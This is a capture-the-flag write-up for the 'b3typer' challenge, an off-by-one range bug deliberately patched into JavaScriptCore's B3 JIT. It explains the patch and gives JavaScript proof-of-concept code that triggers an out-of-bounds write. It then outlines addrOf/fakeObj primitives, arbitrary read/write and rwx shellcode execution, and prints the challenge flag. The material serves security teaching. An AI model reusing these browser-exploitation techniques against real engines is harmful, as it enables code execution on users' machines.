# b3typer

**tl;dr**

+ Simple typer bug, range of BitAnd opcode is assumed to be [1, operand] when in reality it is [0, operand].
+ Use range assumptions to create unchecked integer underflow.
+ Bypass array bounds checks and obtain OOB write, overwrite size of array to get overlap.
+ Use double & object array overlap to create addrOf & fakeObj primitives.
+ Create overlapping fake array using StructureID leak to obtain arbitrary R/W.

## Challenge Description & Handout

`Typer bugs are easy to exploit, right?.`

The challenge handout contained both the `Debug` and `Release` builds of JSC, the patches for both the debug and release builds (the release build had a lot of JSC shell functions removed), as well as a `README` containing build instructions, and a few tips to help you get started with building the environment.

## Prerequisites

If you are completely new to JSC, or browser exploitation in general, I'd recommend getting started by reading other resources. A good place to get started would be [this phrack paper by 5aelo](http://phrack.org/papers/attacking_javascript_engines.html) and [this YouTube playlist by LiveOverflow](https://www.youtube.com/playlist?list=PLhixgUqwRTjwufDsT1ntgOY9yjZgg5H_t). I would also recommend trying out [the JSC challenge I made for last year's InCTF Internationals](https://github.com/d4rk-kn1gh7/DeadlyFastGraph) (shameless self-plug), which is pretty easily to solve as a beginner.

## Building JSC

I would highly recommend building JSC locally on your own machine, in order to be able to add debug prints (`dataLog` is a pretty helpful function for this), and for better source code navigation. Instructions for building the debug version of JSC specific to the challenge were given in the `README` of the challenge handout:

```sh
git clone https://github.com/WebKit/WebKit.git
cd WebKit
git checkout 645b9044d2369e3b083b171da517a2440bb4fa18
git apply debug.patch
Tools/gtk/install-dependencies
Tools/Scripts/build-webkit --jsc-only --debug
cd WebKitBuild/Debug/bin

./jsc --useConcurrentJIT=false
```

In case you cannot build JSC locally, you can work on the challenge using the `jsc` binaries included in the handout, and by following the instructions in the `README`.

## Patch Analysis

The patch is pretty simple, the gist of which is as follows:

```diff
     template<typename T>
     static IntRange rangeForMask(T mask)
     {
         if (!(mask + 1))
             return top<T>();
         if (mask < 0)
             return IntRange(INT_MIN & mask, mask & INT_MAX);
-        return IntRange(0, mask);
+        return IntRange(1, mask);
     }

```

This is a small segment of code in `B3ReduceStrength.cpp`, which is the B3 optimization phase that handles Strength Reduction.

So what does this code do? Searching for xrefs to this function gives us a better idea:

```cpp
IntRange rangeFor(Value* value, unsigned timeToLive = 5)
{
    // .....
    case BitAnd:
        if (value->child(1)->hasInt())
            return IntRange::rangeForMask(value->child(1)->asInt(), value->type());
        break;
    // ......
}
```

Ok, so now this seems pretty clear. The function generates a range for a `BitAnd` operation, where the second operand is an integer. It returns a range of `[1, mask]` as opposed to `[0, mask]`.

So for example, if we were to take the Bitwise And operation `x & 0xff`, the rangeForMask function would return a range of `[1, 0xff]`, instead of returning a range of `[0, 0xff]`. Thus, we can assume that the JIT compiler would assume that the result of the operation lies in the former range, instead of the latter (how this is useful will be explained later).

Now, it is pretty clear that this is an off-by-one bug, so how do we trigger it, and exploit it?

Again, searching for xrefs to the `rangeFor` function within the same file, we see that rangeFor is called to generate ranges for both the left and right operands of the `CheckAdd` and `CheckSub` opcodes, within the main `reduceValueStrength` function:

```cpp

void reduceValueStrength()
{
    // ...
    case CheckAdd: {
        // ...
        IntRange leftRange = rangeFor(m_value->child(0));
        IntRange rightRange = rangeFor(m_value->child(1));
        if (!leftRange.couldOverflowAdd(rightRange, m_value->type())) {
            replaceWithNewValue(
                m_proc.add<Value>(Add, m_value->origin(), m_value->child(0), m_value->child(1)));
            break;
        }
        break;
    }
    // ...
}
```

Since the handling of `CheckAdd` and `CheckSub` opcodes are pretty similar in this scenario, I'll go over the `CheckAdd` opcode.

This generates a `rangeFor` for the left and right operands, and checks if they could overflow, using the `couldOverflowAdd` function.

```cpp
template<typename T>
bool couldOverflowAdd(const IntRange& other)
{
    return sumOverflows<T>(m_min, other.m_min)
        || sumOverflows<T>(m_min, other.m_max)
        || sumOverflows<T>(m_max, other.m_min)
        || sumOverflows<T>(m_max, other.m_max);
}
```

Digging about 5 functions deep, we can eventually find out that if any combination of values in the left and right ranges could possibly overflow, the function `couldOverflowAdd` returns True.

Going back to the `reduceValueStrength` function for the `CheckAdd` opcode, we can see that if `couldOverflowAdd` returns False, the `CheckAdd` node is replaced with a normal `Add` opcode, with the same 2 operands.

So now the question is, how does `CheckAdd` differ from `Add`? To answer that question, we can take a look at the `lower` function in `B3LowerToAir.cpp`

```cpp
void lower() {
    // ...
    case CheckAdd:
        opcode = opcodeForType(BranchAdd32, BranchAdd64, m_value->type());
    // ...
```

When B3 IR is lowered to AIR (which is the most optimized IR), it seems to actually replace the `CheckAdd` opcode with an `Add64` opcode in AIR, turning the 32-bit addition into a 64-bit addition, to safely avoid the potential overflow.

Ok, so now this makes sense. Using our off-by-one primitive, we can likely make the `couldOverflowAdd` function return False, thus converting a safe `CheckAdd` opcode into an unsafe `Add` opcode!

The next question is, how can this be exploited?

## Exploitation

## Triggering an OOB write

So based on the information we've gathered so far, these are the rough steps to trigger the bug:

1. Generate a BitAnd opcode, with one of the operands being a constant.
2. Generate a CheckAdd opcode, with one of the operands being the previously generated BitAnd.
3. Cause the CheckAdd to overflow/underflow by 1 based on the incorrect range.

The tricky part of this exploit is that we have to create the underflow/overflow within the Strength Reduction phase, as the `rangeFor` function doesn't propagate any information outside of this phase.

Let's generate a small PoC to start off with:

```js
function hax(a) {
    let b = a | 0;
    let c = b & 2;
    let d = c + -1;
    return d;
}
```

Okay, so what does this do?

+ First off, we force `b` to be a 32-bit integer, by using a bitwise OR operation. This is necessary to tell the compiler that we are dealing with 32-bit integers, and not floating-point values. This technique is described well by 5aelo in his [amazing blog post](https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html).

+ Next, we generate the vulnerable `BitAnd` opcode, using a bitwise AND operation with a constant.

+ Finally, we generate a `CheckAdd` opcode, this will cause the B3 Strength Reduction phase to call the `rangeFor` function, which will generate an incorrect range. 

Here, the range for the left operand will be `[1, 2]`, when in reality the range of the `BitAnd` operation should be `[0, 2]`.

Ok, now what? How can we cause an overflow by 1?

Why not generate another `CheckAdd` opcode with the result of the previous opcode? Now this will call `rangeFor` again, and generate a range of `[0, 1]` for the left operand, when in reality the range is `[-1, 1]`.

Now our left operand contains a potential negative value that is unaccounted for, and all we have to do is create an operation that underflows it.

Using the right operand as `-0x80000000` (32-bit INT_MIN), the ranges generated for the left and right operands are `[0, 1]` and `[-0x80000000]` respectively. 

```js
let b = a | 0;
let c = b & 2;
let d = c + -1;
let e = d + -0x80000000;
```

Here, `couldOverflowAdd` returns False, as the addition of all combinations of values in these ranges will not overflow. 

This is where the bug is exploitable - the range for the left operand is actually `[-1, 1]`, and `-1 + -0x80000000` can cause an underflow!

We can confirm this assumption by using the following code snippet:

```js
function hax(a) {
    let b = a | 0;
    let c = b & 2;
    let d = c + -1;
    let e = d + -0x80000000;
    return e;
}
function main() {
    for(let i = 0; i < 100000; ++i) {
        hax(2);
    }
}
noInline(hax);
noDFG(main);
noFTL(main);
main();
```

Small note: JIT compiling this with an argument of `2` works better, as it never triggers the vulnerable case (when the result of `b & 2 == 0`)

Taking a look at the B3 IR generated to confirm our assumptions (you can do this by using the flag `--dumpB3GraphAtEachPhase=true`):

```
B3 after reduceDoubleToFloat, before reduceStrength:
...
b3      Int32 b@35 = CheckAdd(b@33:WarmAny, $-1(b@34):WarmAny, b@33:ColdAny, generator = 0x7f551e032750, earlyClobbered = [], lateClobbered = [], usedRegisters = [], ExitsSideways|Reads:Top, D@41)
b3      Int32 b@37 = CheckAdd(b@35:WarmAny, $-2147483648(b@36):WarmAny, b@35:ColdAny, generator = 0x7f551e0327a0, earlyClobbered = [], lateClobbered = [], usedRegisters = [], ExitsSideways|Reads:Top, D@45)
...
B3 after reduceStrength, before eliminateCommonSubexpressions:
...
b3      Int32 b@23 = Add(b@33, $2147483647(b@37), D@45)
...
```

We can see that the two `CheckAdd` nodes have been eliminated for a single unchecked `Add` node. In fact, instead of subtracting `1` and `0x80000000` from the value, it just adds `0x7fffffff` to the value, assuming it will wrap around to a negative integer. This assumption is wrong, as if the left operand is `0`, the result will be `0x7fffffff`, a positive value.

Ok, so how can we turn this into an OOB read?

Taking inspiration from [5aelo's blog post](https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html) again, we create 2 checks so that `DFGIntegerRangeOptimization` will remove array bounds checks:

1. `idx < arr.length`
2. `idx >= 0`

After the first check, if we only do "safe" subtractions, it should theoretically still be safe to read the array at `idx`, as `idx` should still be less than `arr.length`.

And now we can obtain an OOB read, simply by triggering the bug (unsafe removal of `CheckAdd`) after the first check.

Here's a small code snippet, that should crash the binary by writing out of bounds:

```js
function hax(arr, a) {
    // Force 32-bit integer
    let b = a | 0;
    // Setup bug trigger
    // compiler assumes range is [1, 2], actually [0, 2]
    let c = b & 2;
    // Trigger rangeFor
    // assumed range [0, 1], actual [-1, 1]
    let idx = c - 1;

    // Check will always pass
    if (idx < arr.length) {
        // Trigger integer underflow, idx will become INT_MAX
        // Compiler assumes this case only triggers for value 0, no underflow check
        if (idx < 1) {
            idx += -0x80000000;
        }
        // idx assumed to be < arr.length, only subtraction occurs
        if (idx > 0) {
            arr[idx] = 0x1337;
        }
    }
}
```

Now, calling `hax(arr, 0)` will cause a crash!

### Finishing up the exploit

Now that we have an OOB write, we need to find a way to control the OOB index. For this, we can simply do another large "safe" subtraction after the first check (`idx < arr.length`). The only caveat here is that we cannot subtract `0x80000000` and another large negative number from the same value, else that will trigger a potential overflow check, and the `CheckAdd` will not be removed for the second overflow.

A simple trick here is to just use different checks, such that the value `-1` will pass both of them, and no other value will. Here are the two checks that I used:
```js
// idx is -1 here, passes the check
if (idx < 1) {
    idx += -0x80000000;
}
// idx is 0x7fffffff here, passes the check
if (idx > 2) {
    idx += -0x7fffffff;
}
```

Now by changing the value `-0x7fffffff` to `-0x7fffffff+required_idx`, we can control idx!

At this point, we can easily generate `addrOf` and `fakeObj` primitives. We can use the OOB write to overwrite the size of a float array (say `dblarr`) with a large value, and cause it to overlap with an object array (say `objarr`). 

Now, we can leak the address of any object, simply by storing an object in `objarr`, and reading out-of-bounds on `dblarr`. This primitive is called `addrOf`.

Similarly, we can create an object at any address by writing OOB on `dblarr`, and retrieving the object from `objarr`. This primitive is called `fakeObj`.

Normally, these two primitives wouldn't be enough to obtain arbitrary read/write, and this is because of a mitigation called `StructureID randomization`.

For this, you need to know what a JSObject looks like in JSC. It has roughly the following layout:
```
JSCell Header
Butterfly pointer
Inline property 1
Inline property 2
...
...
```
Each of these terms will be concisely defined later in the writeup.

To fake an object, you need a valid JSCell header, and a butterfly. Cell headers consists of two parts:

+ Upper 32 bits: Flags
+ Lower 32 bits: StructureID

The flags for a particular type of object are constant across runs, but the StructureIDs are randomized at runtime. Thus to generate a valid object, you need a `StructureID` leak.

For the purpose of making this challenge less of a hassle, a `StructureID` leak is provided in the given patch:

```diff
@@ -285,4 +287,16 @@ JSC_DEFINE_HOST_FUNCTION(reflectObjectSetPrototypeOf, (JSGlobalObject* globalObj
     return JSValue::encode(jsBoolean(didSetPrototype));
 }
 
+JSC_DEFINE_HOST_FUNCTION(reflectObjectStrid, (JSGlobalObject* globalObject, CallFrame* callFrame))
+{
+    VM& vm = globalObject->vm();
+    auto scope = DECLARE_THROW_SCOPE(vm);
+
+    JSValue target = callFrame->argument(0);
+    if (!target.isObject())
+        return JSValue::encode(throwTypeError(globalObject, scope, "Reflect.strid requires the first argument be an object"_s));
+    JSObject* targetObject = asObject(target);
+    RELEASE_AND_RETURN(scope, JSValue::encode(jsNumber(targetObject->structureID().bits())));
+}
+
```

Here, you can use `Reflect.strid(obj)` to obtain a `StructureID` leak for that particular object.

What is the butterfly? The butterfly is a buffer that contains array elements at positive indices and out-of-line properties at negative indices.

Ok, so the butterfly is similar to an ArrayBuffer backing store pointer, in a sense. That means we just need to be able to corrupt the butterfly of an object to an arbitrary value, to then achieve arbitrary read/write (well, more or less, good enough for this challenge).

So now, our method of exploitation is similar to a basic CTF heap note challenge :)

First, we create an object (preferably a float array) - which we will later target by corrupting its butterfly (lets refer to this object as `target`).

Then we create an object with two inline properties (inline properties are properties that are stored within the JSObject), and lets call this object `container`. These inline properties are:
+ Fake JSCell header
+ Fake butterfly

We create the fake butterfly such that it points to `target`'s butterfly.
 
Now we have something like this:
```
fake butterfly -> target butterfly -> ?
```

After this, we can use the `fakeObj` primitive to create a fake object at the address of `container`'s first inline property, let's call this new object `fake`. Now writing to `fake`'s butterfly will overwrite `target`'s butterfly!

Now we have (almost) arbitrary read-write:
+ Read: Store address to read from in fake[0], return target[0] to get value at address.
+ Write: Store address to write to in fake[0], store value to write in target[0].

Using all the primitives we have constructed so far, the rest of the exploit is pretty easy. We can use either a JIT compiled function or a wasm function, which will both create `rwx` pages, write our own shellcode to the generated `rwx` page, then call the aforementioned function, to get code execution! 

## Exploit Script

Stable OOB read:

```js
function hax(arr, a) {
    // Force 32-bit integer
    let b = a | 0;
    // Setup bug trigger
    // compiler assumes range is [1, 2], actually [0, 2]
    let c = b & 2;
    // Trigger rangeFor
    // assumed range [0, 1], actual [-1, 1]
    let idx = c - 1;

    // Check will always pass
    if (idx < arr.length) {
        // Trigger integer underflow, idx will become INT_MAX
        // Compiler assumes this case only triggers for value 0, no underflow check
        if (idx < 1) {
            idx += -0x80000000;
        }
        // Use this to set oob write index
        if (idx > 2) {
            idx += -0x7ffffffa;
        }
        // idx assumed to be < arr.length, only subtraction occurs so upper bound is unchecked
        // Overwrite length of array to 0x1337
        if (idx > 0) {
            arr[idx] = 0x1337;
        }
    }
}

noInline(hax);

var arr = new Array(5);
var dblarr = new Array(5);
var objarr = new Array(5);
arr.fill(1);
dblarr.fill(13.37);
objarr.fill({});

function trigger() {
    for (var i = 0; i < 100000; ++i) {
        hax(arr, 2);
    }
    hax(arr, 1);

}
```
The full exploit script can be found [here](https://gist.github.com/d4rk-kn1gh7/65651373a09b7e98c0c4a3a727204d59).

## Flag

`bi0s{typ3r_expl01ts_b3_ez_d33e42198c98}`

## Final Notes

StarLabs published [an excellent writeup](https://starlabs.sg/blog/2022/09-step-by-step-walkthrough-of-cve-2022-32792/) about a Pwn2Own exploit for which the bug is in a similar place, and I recommend checking out their blog post as well. I also got this challenge idea by auditing the patch for the same bug, CVE-2022-32792.

Thanks to [sherl0ck](https://twitter.com/sherl0ck__) for testing the challenge and proofreading the writeup, and shout-out to [dagger](https://twitter.com/0xdagger) for being the only person to solve the challenge during the CTF.

Want to try out the challenge? Our [CTF site](https://ctf.bi0s.in) is still up at the time of writing, but you can always download the handout [here](https://drive.google.com/file/d/1N15pe7jRbVWEwahUse71d4vHWqaXdrJc/view?usp=sharing).

I hope you guys enjoyed the challenge, I learnt a lot while trying to exploit it! Feel free to reach out to me on [twitter](https://twitter.com/_d4rkkn1gh7) for any questions/queries regarding this writeup.
